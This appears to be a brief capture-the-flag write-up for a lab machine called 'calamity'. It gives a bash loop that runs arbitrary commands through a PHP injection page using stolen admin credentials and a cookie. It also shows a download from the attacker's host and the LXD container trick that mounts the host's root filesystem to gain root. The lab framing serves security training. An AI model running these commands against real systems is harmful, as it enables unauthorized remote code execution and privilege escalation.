from the source code we got the creds for admin

and a execution page for php

we tried all payload but ==connection disconnectsÂ ==

so we write a shell that takes input and executes it

```
#!/bin/bash

while :
do
    echo -n "calamity> "
    read cmd
    if [ "$cmd" = "exit" ]; then exit; fi
    curl -s -G http://10.10.10.27/admin.php --data-urlencode "html=<?php system(\"$cmd\"); ?>" --cookie adminpowa=noonecares | sed -e '1,/<\/body><\/    html>/ d'
done
```

and now a stable shell is there..

we copied /bin/bash in tmp and did the bash -c 'bash..' payload and got a shell

now we see we are ==lxc==

so

```
git clone https://github.com/saghul/lxd-alpine-builder
sudo ./build-alpine
we had 2 files v-3.18 didnot work so we used 3.8 and it worked
wget http://10.10.14.10/apline-v3.10-x86_64-20191008_1227.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

and in /mnt/root our whole directory is there
```
